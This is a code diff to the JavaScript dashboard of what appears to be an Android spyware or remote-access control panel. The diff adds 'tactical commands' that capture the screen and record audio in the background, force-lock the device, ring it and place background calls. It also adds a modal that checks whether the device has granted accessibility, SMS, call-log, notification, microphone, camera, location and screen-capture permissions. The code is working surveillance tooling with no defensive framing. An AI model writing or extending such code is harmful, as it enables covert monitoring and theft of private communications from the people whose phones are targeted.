@@ -175,7 +175,7 @@ window.pollForMedia = async (actionTime, mediaType) => {
     if (!deviceId || !token) return;
 
     let attempts = 0;
-    const maxAttempts = 25; // 25 attempts * 3 sec = max 75 seconds wait time
+    const maxAttempts = 25; 
 
     if (window.activePollId) clearInterval(window.activePollId);
 
@@ -195,7 +195,6 @@ window.pollForMedia = async (actionTime, mediaType) => {
             const result = await res.json();
             
             if (result.status === 'success' && result.data && result.data.length > 0) {
-                // Check if the latest file matches our requested type and was uploaded AFTER the action was triggered
                 const latestFile = result.data[0];
                 const fileTime = new Date(latestFile.uploaded_at).getTime();
                 
@@ -210,15 +209,19 @@ window.pollForMedia = async (actionTime, mediaType) => {
     }, 3000); 
 };
 
+// ==========================================
+// 🚀 TACTICAL COMMANDS EXECUTORS
+// ==========================================
+
 window.requestScreenshot = () => {
-    const actionTime = Date.now() - 5000; // Buffer time
+    const actionTime = Date.now() - 5000;
     setLiveOpsStatus('pending', 'Injecting Screen Capture Payload...');
     window.executeRemoteAction('take_screenshot');
     window.pollForMedia(actionTime, 'screenshot');
 };
 
 window.requestAudioSync = () => {
-    const actionTime = Date.now() - 5000; // Buffer time
+    const actionTime = Date.now() - 5000;
     const duration = document.getElementById('audio-duration').value;
     setLiveOpsStatus('pending', `Recording Audio Background (${duration}s)...`);
     window.executeRemoteAction('record_audio', { duration: parseInt(duration) });
@@ -228,7 +231,17 @@ window.requestAudioSync = () => {
 window.forceLockDevice = () => {
     alert("Lock Command Sent. Device Admin permissions will handle execution.");
     window.executeRemoteAction('force_lock');
-}
+};
+
+window.triggerRing = () => {
+    alert("Ring Command Queued: The device will play an alarm at max volume.");
+    window.executeRemoteAction('ring_device');
+};
+
+window.triggerSOS = () => {
+    alert("SOS Call Initiated: The device will attempt a background call to the Admin.");
+    window.executeRemoteAction('call_admin');
+};
 
 // Global Device Deletion
 window.deleteDevice = async function(deviceId) {
@@ -248,6 +261,87 @@ window.deleteDevice = async function(deviceId) {
     } catch (e) {
         console.error("Delete Action Failed:", e);
     }
+};
+
+// ==========================================
+// 🚀 DIAGNOSTICS & SETTINGS CHECK ENGINE
+// ==========================================
+
+window.openSettingsCheckModal = async () => {
+    const modal = document.getElementById('diagnostics-modal');
+    const content = document.getElementById('diagnostics-content');
+    const deviceId = localStorage.getItem('active_device_id');
+
+    if (!modal || !content) return;
+    
+    modal.style.display = 'flex';
+    content.innerHTML = '<p style="color: #888; text-align: center; margin-top: 20px;">Fetching remote diagnostic data from Supabase...</p>';
+
+    if (!deviceId) {
+        content.innerHTML = '<p style="color: #e74c3c; text-align: center; margin-top: 20px;">No active device selected.</p>';
+        return;
+    }
+
+    try {
+        const configRes = await fetch('/api/config');
+        const config = await configRes.json();
+        
+        // Supabase query to get the latest permission sync data for the active device
+        const permRes = await fetch(`${config.supabase_url}/rest/v1/permissions?device_id=eq.${deviceId}&order=created_at.desc&limit=1`, {
+            headers: {
+                'apikey': config.supabase_key,
+                'Authorization': `Bearer ${config.supabase_key}`
+            }
+        });
+
+        const data = await permRes.json();
+
+        if (!data || data.length === 0) {
+            content.innerHTML = '<p style="color: #f39c12; text-align: center; margin-top: 20px;">No diagnostic data received from device yet.</p>';
+            return;
+        }
+
+        const perms = data[0];
+        
+        // Matrix Map Builder
+        const map = {
+            'Accessibility (Core Engine)': perms.accessibility,
+            'Location Tracking': perms.location,
+            'Notification Access': perms.notification_access,
+            'Storage & Media Files': perms.storage,
+            'Microphone (Live Ops)': perms.microphone,
+            'Camera Access': perms.camera,
+            'Call Logs Parsing': perms.call_log,
+            'SMS Message Sync': perms.sms,
+            'Phone State Monitoring': perms.phone,
+            'Screen Capture Overlay': perms.screen_recording
+        };
+
+        let html = '<div style="display: flex; flex-direction: column; gap: 10px; margin-top: 15px;">';
+        
+        for (const [key, value] of Object.entries(map)) {
+            const color = value ? '#2ecc71' : '#e74c3c';
+            const icon = value ? '✔' : '✖';
+            html += `
+                <div style="display: flex; justify-content: space-between; align-items: center; background: #2a2a2a; padding: 12px 15px; border-radius: 6px; border-left: 4px solid ${color};">
+                    <span style="font-weight: 600; color: #ddd; font-size: 14px;">${key}</span>
+                    <span style="color: ${color}; font-weight: 900; font-size: 18px;">${icon}</span>
+                </div>
+            `;
+        }
+        html += '</div>';
+        
+        content.innerHTML = html;
+
+    } catch (e) {
+        console.error("Diagnostics Fetch Error:", e);
+        content.innerHTML = '<p style="color: #e74c3c; text-align: center; margin-top: 20px;">Network Error. Failed to fetch diagnostics.</p>';
+    }
+};
+
+window.closeSettingsCheckModal = () => {
+    const modal = document.getElementById('diagnostics-modal');
+    if (modal) modal.style.display = 'none';
 };
 
 document.addEventListener('DOMContentLoaded', () => {
